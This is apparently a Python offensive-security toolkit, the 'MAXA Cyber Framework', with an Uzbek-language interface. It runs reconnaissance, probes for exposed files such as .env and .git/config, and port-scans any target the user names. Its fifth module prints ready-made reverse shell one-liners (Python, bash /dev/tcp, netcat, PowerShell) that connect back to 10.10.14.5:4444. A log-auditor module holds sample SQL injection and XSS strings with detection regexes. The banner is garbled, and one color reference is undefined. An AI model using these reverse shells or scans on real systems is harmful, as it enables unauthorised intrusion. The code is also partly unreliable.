#!/usr/bin/env python3
"""
MAXA CYBER FRAMEWORK v2.0 - Ultimate All-In-One Cyber Security Suite
Modules included for Red, White, and Purple Teams:
  1. Red Team OSINT & Target Reconnaissance Engine
  2. Advanced Web Vulnerability & Payload Fuzzer
  3. Network Service Discovery & Port Scanner
  4. Purple Team Threat Intelligence & Log Intrusion Auditor
  5. Cryptographic Guard & Exploit Payload Assistant

Author: MAXA Cyber
"""

import sys
import os
import re
import math
import time
import socket
import ssl
import json
import hashlib
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ==========================================
# TERMINAL COLORS & UI DISPLAY
# ==========================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BANNER = f"""{Colors.OKCYAN}{Colors.BOLD}
 ╔═══════════════════════════════════════════════════════════════════════════╗
 ║  ███╗   ███╗██xA██╗██╗  ██╗██xA██╗  ██████╗██╗██╗  ██╗███████╗██████╗  ║
 ║  ████╗ ████║██╔██╗╚██╗██╔╝██╔██╗  ██╔════╝╚██╗██╔╝██╔════╝██╔══██╗ ║
 ║  ██╔████╔██║███████║╚███╔╝ ███████║  ██║      ╚███╔╝ █████╗  ██████╔╝ ║
 ║  ██║╚██╔╝██║██╔══██║██╔██╗ ██╔══██║  ██║       ██╔██╗ ██╔══╝  ██╔══██╗ ║
 ║  ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗██║  ██║  ╚██████╗  ██║  ██║███████╗██║  ██║ ║
 ║  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═════╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ║
 ╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}{Colors.WARNING}     ALL-IN-ONE OFFENSIVE & DEFENSIVE CYBER SUITE v2.0 (Red / White / Purple){Colors.ENDC}
"""

# ==========================================
# MODULE 1: OSINT & RECONNAISSANCE ENGINE
# ==========================================
class OSINTEngine:
    """Module 1: Red/White Team OSINT & Target Reconnaissance Engine"""
    def __init__(self, target):
        self.target = target.replace("http://", "").replace("https://", "").strip("/")
        self.ip = None

    def execute(self):
        print(f"\n{Colors.OKCYAN}{Colors.BOLD}[=== MODULE 1: OSINT & RECONNAISSANCE ENGINE ===]{Colors.ENDC}")
        try:
            self.ip = socket.gethostbyname(self.target)
            print(f"  {Colors.OKGREEN}[✓] Target IP Manzili:{Colors.ENDC} {self.ip}")
        except Exception as e:
            print(f"  {Colors.FAIL}[✗] IP aniqlanmadi: {e}{Colors.ENDC}")
            return

        self._fetch_geolocation()
        self._inspect_ssl()
        self._check_dns_records()

    def _fetch_geolocation(self):
        print(f"\n  {Colors.BOLD}[+] IP Geolokatsiya & ISP Ma'lumotlari:{Colors.ENDC}")
        try:
            url = f"http://ip-api.com/json/{self.ip}"
            req = urllib.request.Request(url, headers={'User-Agent': 'MAXA-Framework/2.0'})
            with urllib.request.urlopen(req, timeout=4) as response:
                data = json.loads(response.read().decode())
                if data.get('status') == 'success':
                    print(f"      - Mamlakat : {data.get('country')} ({data.get('countryCode')})")
                    print(f"      - Shahar    : {data.get('city')}")
                    print(f"      - ISP       : {data.get('isp')}")
                    print(f"      - AS        : {data.get('as')}")
        except Exception as e:
            print(f"      - {Colors.WARNING}Geolokatsiyani olib bo'lmadi: {e}{Colors.ENDC}")

    def _inspect_ssl(self):
        print(f"\n  {Colors.BOLD}[+] SSL/TLS Sertifikati Tahlili:{Colors.ENDC}")
        ctx = ssl.create_default_context()
        try:
            with socket.create_connection((self.target, 443), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    subject = dict(x[0] for x in cert.get('subject', []))
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    print(f"      - Common Name  : {subject.get('commonName', 'N/A')}")
                    print(f"      - Imzolagan    : {issuer.get('organizationName', 'N/A')}")
                    print(f"      - Amal muddati : {cert.get('notAfter', 'N/A')}")
        except Exception as e:
            print(f"      - {Colors.WARNING}SSL Ma'lumotlari olib bo'lmadi: {e}{Colors.ENDC}")

    def _check_dns_records(self):
        print(f"\n  {Colors.BOLD}[+] Asosiy Subdomenlar Tekshiruvi:{Colors.ENDC}")
        subdomains = ["www", "mail", "admin", "dev", "api", "vpn", "test", "portal", "stage"]
        for sub in subdomains:
            full_domain = f"{sub}.{self.target}"
            try:
                sub_ip = socket.gethostbyname(full_domain)
                print(f"      {Colors.OKGREEN}[FOUND]{Colors.ENDC} {full_domain:<25} -> {sub_ip}")
            except:
                pass


# ==========================================
# MODULE 2: WEB VULNERABILITY & PAYLOAD FUZZER
# ==========================================
class WebVulnerabilityFuzzer:
    """Module 2: Advanced Web Vulnerability & Security Header Auditor"""
    SECURITY_HEADERS = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options", "X-XSS-Protection"
    ]

    SENSITIVE_PATHS = [
        ".env", ".git/config", "admin/", "phpmyadmin/", "backup.sql",
        "config.php", "db.sqlite", "robots.txt", "server-status", "api/v1/"
    ]

    def __init__(self, target):
        self.target = target.rstrip('/')
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target

    def execute(self):
        print(f"\n{Colors.OKCYAN}{Colors.BOLD}[=== MODULE 2: WEB VULNERABILITY & PAYLOAD FUZZER ===]{Colors.ENDC}")
        self._audit_headers()
        self._fuzz_paths()

    def _audit_headers(self):
        print(f"\n  {Colors.BOLD}[+] Web Xavfsizlik Sarlavhalari (Security Headers) Auditi:{Colors.ENDC}")
        try:
            req = urllib.request.Request(self.target, headers={'User-Agent': 'MAXA-Vulnerability-Fuzzer/2.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                headers = dict(response.headers)
                print(f"      - Server Texnologiyasi: {headers.get('Server', 'Yashiringan')}")
                for h in self.SECURITY_HEADERS:
                    if h in headers:
                        print(f"      {Colors.OKGREEN}[✓] {h}:{Colors.ENDC} {headers[h][:45]}...")
                    else:
                        print(f"      {Colors.FAIL}[✗] YETISHMAYDI (Xavf):{Colors.ENDC} {h}")
        except Exception as e:
            print(f"      {Colors.WARNING}[!] Sarlavhalarni tahlil qilib bo'lmadi: {e}{Colors.ENDC}")

    def _fuzz_paths(self):
        print(f"\n  {Colors.BOLD}[+] Yashirin Katalog va Xavfli Fayllar Fuzzing:{Colors.ENDC}")
        def check_path(path):
            url = f"{self.target}/{path}"
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as res:
                    if res.getcode() == 200:
                        print(f"      {Colors.OKGREEN}[VULN/EXPOSED]{Colors.ENDC} /{path:<20} (Status: 200 OK)")
            except urllib.error.HTTPError as e:
                if e.code in [301, 302, 403]:
                    print(f"      {Colors.YELLOW}[PROTECTED/REDIRECT]{Colors.ENDC} /{path:<20} (Status: {e.code})")
            except:
                pass

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_path, self.SENSITIVE_PATHS)


# ==========================================
# MODULE 3: NETWORK SERVICE DISCOVERY SCANNER
# ==========================================
class NetworkDiscoveryScanner:
    """Module 3: Fast Multi-Threaded Port & Service Version Scanner"""
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 6379: "Redis"
    }

    def __init__(self, target_ip):
        self.target_ip = target_ip

    def execute(self):
        print(f"\n{Colors.OKCYAN}{Colors.BOLD}[=== MODULE 3: NETWORK SERVICE DISCOVERY SCANNER ===]{Colors.ENDC}")
        print(f"  {Colors.BOLD}Target IP:{Colors.ENDC} {self.target_ip}\n")
        print(f"  {'PORT':<10} {'XIZMAT':<15} {'HOLAT':<12} {'BANNER / TEXNOLOGIYA'}")
        print("  " + "-" * 60)

        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.2)
                res = sock.connect_ex((self.target_ip, port))
                if res == 0:
                    service = self.COMMON_PORTS.get(port, "Noma'lum")
                    banner = ""
                    try:
                        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        banner = sock.recv(512).decode(errors='ignore').split('\r\n')[0]
                    except:
                        pass
                    sock.close()
                    print(f"  {Colors.OKGREEN}{port:<10}/TCP{Colors.ENDC} {service:<15} {Colors.OKGREEN}OCHIQ{Colors.ENDC}        {banner}")
                sock.close()
            except:
                pass

        with ThreadPoolExecutor(max_workers=15) as executor:
            executor.map(scan_port, self.COMMON_PORTS.keys())


# ==========================================
# MODULE 4: PURPLE TEAM THREAT INTEL & LOG AUDITOR
# ==========================================
class LogIntrusionAuditor:
    """Module 4: Purple Team Threat Intelligence & Real-time Log Auditor"""
    def __init__(self, log_sample=None):
        self.log_sample = log_sample if log_sample else """
Oct 24 18:01:02 server sshd[1234]: Failed password for root from 192.168.1.100 port 45222 ssh2
Oct 24 18:01:05 server sshd[1235]: Failed password for root from 192.168.1.100 port 45224 ssh2
Oct 24 18:01:08 server sshd[1236]: Failed password for admin from 192.168.1.100 port 45226 ssh2
Oct 24 18:02:15 server nginx: 10.0.0.5 - - [24/Oct/2026] "GET /admin' OR '1'='1 HTTP/1.1" 200 4502
Oct 24 18:02:20 server nginx: 10.0.0.5 - - [24/Oct/2026] "GET /<script>alert(1)</script> HTTP/1.1" 404 120
"""

    def execute(self):
        print(f"\n{Colors.OKCYAN}{Colors.BOLD}[=== MODULE 4: PURPLE TEAM THREAT INTEL & LOG AUDITOR ===]{Colors.ENDC}")
        ssh_brute = {}
        web_sqli = []
        web_xss = []

        for line in self.log_sample.strip().split('\n'):
            failed_ssh = re.search(r'Failed password for (?:invalid user )?(\w+) from ([\d\.]+)', line)
            if failed_ssh:
                user, ip = failed_ssh.groups()
                ssh_brute[ip] = ssh_brute.get(ip, 0) + 1

            if re.search(r"('|%27)|(union|select|insert|drop|where|or|and)\b", line, re.IGNORECASE):
                web_sqli.append(line)

            if re.search(r"(<script>|%3Cscript%3E|javascript:)", line, re.IGNORECASE):
                web_xss.append(line)

        print(f"\n  {Colors.BOLD}[+] SSH Brute-Force Hujumlar Aniqlanishi:{Colors.ENDC}")
        for ip, count in ssh_brute.items():
            severity = f"{Colors.FAIL}[CRITICAL]{Colors.ENDC}" if count >= 3 else f"{Colors.WARNING}[WARNING]{Colors.ENDC}"
            print(f"      {severity} IP: {ip:<15} -> {count} marta noto'g'ri parol kiritingan")

        print(f"\n  {Colors.BOLD}[+] Veb Hujumlar Signaturalari:{Colors.ENDC}")
        print(f"      - SQL Injection urinishlari: {Colors.FAIL}{len(web_sqli)} ta{Colors.ENDC}")
        print(f"      - Cross-Site Scripting (XSS): {Colors.FAIL}{len(web_xss)} ta{Colors.ENDC}")


# ==========================================
# MODULE 5: CRYPTO GUARD & PAYLOAD ASSISTANT
# ==========================================
class CryptoPayloadAssistant:
    """Module 5: Cryptographic Guard, Hash Cracker & Reverse Shell Payload Generator"""
    def execute(self):
        print(f"\n{Colors.OKCYAN}{Colors.BOLD}[=== MODULE 5: CRYPTO GUARD & EXPLOIT PAYLOAD ASSISTANT ===]{Colors.ENDC}")
        print(f"\n  {Colors.BOLD}[1] Reverse Shell Payload Generator:{Colors.ENDC}")
        ip = "10.10.14.5"
        port = 4444
        print(f"      - Python    : python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
        print(f"      - Bash      : bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        print(f"      - Netcat    : nc -e /bin/bash {ip} {port}")
        print(f"      - PowerShell: $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});...")

        print(f"\n  {Colors.BOLD}[2] Hash Identifikatsiya va Xavfsizlik Tahlili:{Colors.ENDC}")
        sample_hash = "5d41402abc4b2a76b9719d911017c592"  # md5('hello')
        print(f"      - Namuna Hash : {sample_hash}")
        print(f"      - Hash Turi   : MD5 (32 belgi / 128 bit)")
        if hashlib.md5("hello".encode()).hexdigest() == sample_hash:
            print(f"      {Colors.OKGREEN}[✓] Hash Paroli Topildi:{Colors.ENDC} hello")


# ==========================================
# MAIN INTERACTIVE FRAMEWORK MENU
# ==========================================
def main():
    print(BANNER)
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "example.com"

    print(f"{Colors.BOLD}Joriy nishon (Target):{Colors.ENDC} {target}\n")
    print("1. Barcha 5 ta modullarni ketma-ket ishga tushirish (Full Cyber Suite)")
    print("2. Module 1: OSINT & Target Reconnaissance")
    print("3. Module 2: Web Vulnerability & Payload Fuzzer")
    print("4. Module 3: Network Service Discovery Scanner")
    print("5. Module 4: Purple Team Threat Intel & Log Auditor")
    print("6. Module 5: Crypto Guard & Exploit Payload Assistant")
    print("0. Chiqish\n")

    choice = input(f"{Colors.BOLD}Tanlovni kiriting [1-6]: {Colors.ENDC}").strip()

    if choice in ['1', '']:
        OSINTEngine(target).execute()
        WebVulnerabilityFuzzer(target).execute()
        try:
            ip = socket.gethostbyname(target.replace("http://", "").replace("https://", "").strip("/"))
            NetworkDiscoveryScanner(ip).execute()
        except:
            pass
        LogIntrusionAuditor().execute()
        CryptoPayloadAssistant().execute()
    elif choice == '2':
        OSINTEngine(target).execute()
    elif choice == '3':
        WebVulnerabilityFuzzer(target).execute()
    elif choice == '4':
        try:
            ip = socket.gethostbyname(target.replace("http://", "").replace("https://", "").strip("/"))
            NetworkDiscoveryScanner(ip).execute()
        except Exception as e:
            print(f"Xatolik: {e}")
    elif choice == '5':
        LogIntrusionAuditor().execute()
    elif choice == '6':
        CryptoPayloadAssistant().execute()
    else:
        print("Chiqildi.")

if __name__ == "__main__":
    main()
